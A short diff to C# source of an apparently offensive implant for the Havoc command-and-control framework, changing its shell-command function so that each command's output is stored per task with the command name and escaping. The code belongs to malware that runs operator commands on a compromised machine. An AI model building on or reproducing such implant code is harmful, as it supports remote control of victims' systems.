@@ -9,7 +9,7 @@ namespace HavocImplant.AgentFunctions
 {
     public class Shell
     {
-        public static void Run(Implant agent, string command)
+        public static void Run(Implant agent, string command, int taskId)
         {
 
             string output = "";
@@ -27,7 +27,7 @@ namespace HavocImplant.AgentFunctions
             process.BeginOutputReadLine();
 
             process.WaitForExit();
-            agent.outputData += output.Replace("\\", "\\\\");
+            agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand, ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand}]\n" + output).Replace("\\", "\\\\").Replace("\"", "\\\""));
         }
     }
 }
